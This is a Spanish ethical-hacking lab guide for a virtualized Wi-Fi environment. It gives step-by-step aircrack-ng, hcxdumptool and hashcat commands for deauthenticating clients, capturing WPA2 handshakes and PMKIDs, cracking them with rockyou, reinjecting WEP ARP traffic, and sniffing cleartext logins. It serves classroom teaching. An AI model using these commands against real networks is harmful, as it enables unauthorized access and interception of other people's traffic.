# Guía de Laboratorio Wi-Fi — Hacking Ético

> **Entorno 100 % virtualizado.** Todas las radios son simuladas con
> `mac80211_hwsim` y aisladas en *network namespaces*. No hay emisión por
> radio real: las prácticas solo funcionan contra los APs de este laboratorio.
> **Uso exclusivamente educativo y en el aula.** Atacar redes reales sin
> autorización expresa por escrito es ilegal (en España, arts. 197 bis y 264
> del Código Penal).

---

## 0. Puesta en marcha

```bash
sudo ./despliegue.sh
```

Al terminar, el script imprime un cuadro con el **SSID, canal, BSSID real y
clave/usuario** de cada escenario. Apunta esos BSSID: cambian en cada
despliegue. Las interfaces de trabajo del alumno son **`wlan0` … `wlan6`**.

### Poner una interfaz en modo monitor

```bash
sudo airmon-ng check kill          # (ya lo hace el script, por si acaso)
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### Localizar objetivos y fijar canal

```bash
# Barrido general: anota BSSID y canal (CH)
sudo airodump-ng wlan0

# Fijar la interfaz al canal del objetivo (ej. canal 11)
sudo iw dev wlan0 set channel 11
```

---

## Resumen de escenarios

| SSID            | Ch | Seguridad   | Objetivo didáctico                         | Clave / credencial |
|-----------------|----|-------------|--------------------------------------------|--------------------|
| `he_open`       | 1  | Abierta     | Sniffing de tráfico en claro (HTTP POST)   | —                  |
| `he_wpa2`       | 6  | WPA2-PSK    | Captura del handshake 4-way + crackeo      | `dragonfly`        |
| `he_pmkid`      | 11 | WPA2-PSK    | PMKID **con** clientes asociados           | `chocolate`        |
| `he_pmkid_nc`   | 4  | WPA2-PSK    | PMKID **sin** clientes (*clientless*)      | `marshmallow`      |
| `he_enterprise` | 3  | WPA2-EAP    | EAP-PEAP / captura de reto MSCHAPv2        | `student_user@domain.lab` |
| `he_wep`        | 9  | WEP-128     | Recolección de IVs + reinyección ARP       | `12345678901234567890123456` |

---

## 1. `he_open` — Red abierta (tráfico en claro)

Un cliente envía un POST de login en bucle. El objetivo es demostrar que en una
red sin cifrado las credenciales viajan legibles.

```bash
sudo iw dev wlan0 set channel 1
sudo airodump-ng -c 1 --bssid <BSSID_OPEN> -w cap_open wlan0
# En otra terminal, filtrar el POST en la captura:
tshark -r cap_open-01.cap -Y 'http.request.method == "POST"' -T fields -e http.file_data
```

**Aprendizaje:** cualquiera en la misma red abierta ve el `user=admin&pass=...`.

---

## 2. `he_wpa2` — Handshake 4-way + crackeo offline

### a) Capturar el handshake

```bash
sudo iw dev wlan0 set channel 6
sudo airodump-ng -c 6 --bssid <BSSID_WPA2> -w cap_wpa2 wlan0
```

### b) Forzar reconexión con un deauth (desde otra terminal)

```bash
# Deauth dirigido al cliente para capturar el handshake al reconectar
sudo aireplay-ng -0 3 -a <BSSID_WPA2> wlan1
```

Cuando airodump muestre `WPA handshake: <BSSID>` arriba a la derecha, ya lo tienes.

### c) Crackear

```bash
# Con aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID_WPA2> cap_wpa2-01.cap

# O con hashcat (modo 22000)
hcxpcapngtool -o hash_wpa2.22000 cap_wpa2-01.cap
hashcat -m 22000 hash_wpa2.22000 /usr/share/wordlists/rockyou.txt
```

> La clave `dragonfly` está en rockyou, así que el crackeo es rápido.

---

## 3. `he_pmkid` — PMKID **con** clientes

Hay una estación asociada generando tráfico. Sirve para contrastar las **dos
vías**: capturar el PMKID (campo del M1) o el handshake 4-way tras un deauth.

```bash
sudo iw dev wlan0 set channel 11

# Opción recomendada: hcxdumptool captura PMKID y handshakes a la vez
sudo hcxdumptool -i wlan0 -w pmkid_cli.pcapng --rds=1
# (Ctrl-C tras unos segundos)

# Extraer el hash 22000 (contiene líneas WPA*01=PMKID y WPA*02=handshake)
hcxpcapngtool -o hash_pmkid.22000 pmkid_cli.pcapng

# Crackear
hashcat -m 22000 hash_pmkid.22000 /usr/share/wordlists/rockyou.txt
```

> La clave `chocolate` también está en rockyou.

---

## 4. `he_pmkid_nc` — PMKID **sin** clientes (*clientless*)

No hay ninguna estación asociada **a propósito**. Es el caso que demuestra por
qué el PMKID es peligroso: el AP incluye el PMKID en el **primer mensaje (M1)**
del RSN durante la asociación, así que **no necesitas ningún cliente** — basta
con provocar tú mismo la asociación para que el AP emita ese M1.

```bash
sudo iw dev wlan0 set channel 4

# hcxdumptool fuerza la asociación contra el AP y recoge el PMKID solo
sudo hcxdumptool -i wlan0 -w pmkid_nc.pcapng --rds=1
# No aparecerá ningún cliente en airodump: el PMKID llega igual.

# Extraer y crackear
hcxpcapngtool -o hash_nc.22000 pmkid_nc.pcapng
hashcat -m 22000 hash_nc.22000 /usr/share/wordlists/rockyou.txt
```

**Comparación clave para el alumno:**

| | `he_pmkid` | `he_pmkid_nc` |
|---|---|---|
| Cliente conectado | Sí | No |
| ¿Hace falta esperar/deauth a un cliente? | Opcional | **No** |
| Material obtenible | PMKID **y** handshake | Solo PMKID |
| Lección | Dos vías de ataque | El PMKID no depende de clientes |

> La clave `marshmallow` está en rockyou.

---

## 5. `he_enterprise` — WPA2-EAP (PEAP/MSCHAPv2)

```bash
sudo iw dev wlan0 set channel 3
sudo airodump-ng -c 3 --bssid <BSSID_ENT> -w cap_ent wlan0
```

Objetivo: observar el intercambio EAP-PEAP y comentar el vector de **Evil Twin /
RADIUS falso** (`hostapd-wpe`) para capturar el challenge/response MSCHAPv2 y
crackearlo con `asleap`. En este laboratorio basta con identificar el tipo de
EAP en la captura:

```bash
tshark -r cap_ent-01.cap -Y eap -T fields -e eap.type
```

---

## 6. `he_wep` — WEP (IVs + reinyección ARP)

Dos clientes generan ARP broadcast en bucle, ideal para la reinyección.

```bash
sudo iw dev wlan0 set channel 9

# Capturar IVs
sudo airodump-ng -c 9 --bssid <BSSID_WEP> -w cap_wep wlan0

# Reinyección ARP para acelerar la generación de IVs (otra terminal)
sudo aireplay-ng -3 -b <BSSID_WEP> wlan1

# Crackear en cuanto haya ~20.000-40.000 IVs
aircrack-ng cap_wep-01.cap
```

---

## Verificación y apagado

```bash
# Ver APs y namespaces activos
ip netns list
sudo ip netns exec ns_ap_pmkid_nc iw dev

# Apagar todo el laboratorio
sudo pkill -9 hostapd wpa_supplicant
for ns in $(ip netns list | awk '/^ns_/{print $1}'); do sudo ip netns del "$ns"; done
sudo modprobe -r mac80211_hwsim
```

---

## Herramientas usadas

- **aircrack-ng suite** (`airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`)
- **hcxdumptool / hcxpcapngtool** (captura y conversión de PMKID/handshake)
- **hashcat** (modo `22000` = WPA-PBKDF2-PMKID+EAPOL)
- **tshark** (análisis de capturas)

> Diccionario de referencia: `rockyou.txt`. Todas las claves de los escenarios
> WPA2 están incluidas en él para que las prácticas sean reproducibles en clase.
